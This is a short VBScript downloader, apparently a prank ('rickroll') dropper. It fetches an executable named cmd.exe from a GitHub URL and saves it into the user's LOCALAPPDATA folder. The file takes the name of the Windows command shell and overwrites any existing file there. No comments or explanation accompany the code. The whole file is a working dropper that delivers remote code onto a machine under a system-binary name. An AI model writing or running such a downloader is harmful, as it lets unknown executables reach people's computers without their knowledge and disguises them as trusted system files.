dim xHttp: Set xHttp = createobject("MSXML2.ServerXMLHTTP.6.0")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://github.com/Gaming4Life-YouTube/rickroll/raw/main/cmd.exe", False
xHttp.Send

dim LocalAppDataPath : LocalAppDataPath = CreateObject("WScript.Shell").Environment("PROCESS")("LOCALAPPDATA")
destFilePath = LocalAppDataPath + "\cmd.exe"

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile destFilePath, 2 '//overwrite
end with